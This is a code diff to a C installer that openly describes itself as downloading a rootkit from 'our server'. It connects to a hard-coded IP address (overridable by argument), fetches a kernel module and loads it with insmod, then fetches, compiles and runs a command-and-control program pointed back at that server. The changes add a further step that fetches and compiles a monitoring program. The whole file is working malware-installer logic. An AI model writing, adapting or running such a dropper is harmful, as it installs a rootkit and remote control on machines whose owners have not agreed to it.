@@ -14,10 +14,13 @@
 
 #define SP_PORT     8895
 #define BUFFER_SIZE 4096
-#define SERVER_ADDR "104.194.123.106"
 #define CMD_RESULT "cmdoutput.txttmp"
+
+char* SERVER_ADDR = "104.194.123.106";
 char* ROOTKIT = "myrootkit.ko";   
 char* CCPROGRAM = "ccprogram.c";  
+char* MONITOR = "monitor.c";  
+
 struct utsname OS_info;
 char buf[BUFFER_SIZE];
 int sock_fd;
@@ -33,30 +36,45 @@ int opensocket();
  * @brief This installer.c is a installer that download the rootkit from our server
  * @return 
  */
-int main()
+int main(int argc,char* argv[])
 {
     int rv;
 
     if(uname(&OS_info)){
         exit(1);
     }
+    
+    if(argc > 1){
+        SERVER_ADDR = argv[1];
+    }
+    
     rv = opensocket();
     rv = obtain(ROOTKIT);
     close(sock_fd);
+    if(rv == 0){
+        char *rktargs[] = {"insmod", ROOTKIT, NULL};
+        execcmd(rktargs);
+    }
     
     rv = opensocket();
     rv = obtain(CCPROGRAM);
     close(sock_fd);
+    if(rv == 0){
+        char *cplargs[] = {"gcc", CCPROGRAM, "-o", "ccprogram", NULL};
+        execcmd(cplargs);
+        
+        char *ccargs[] = {"./ccprogram", SERVER_ADDR, NULL};
+        execcmd(ccargs);
+    }
     
-    char *rktargs[] = {"insmod", ROOTKIT, NULL};
-    if(rv == 0) execcmd(rktargs);
+    rv = opensocket();
+    rv = obtain(MONITOR);
+    close(sock_fd);
+    if(rv == 0){
+        char *moniargs[] = {"gcc", MONITOR, "-o", "monitor", NULL};
+        execcmd(moniargs);
+    }
     
-    char *cplargs[] = {"gcc", CCPROGRAM, "-o", "ccprogram", NULL};
-    if(rv == 0) execcmd(cplargs);
-    
-    char *ccargs[] = {"./ccprogram", SERVER_ADDR, NULL};
-    if(rv == 0) execcmd(ccargs);
-   
     printf("Install success!\n");
     return 0;
 }
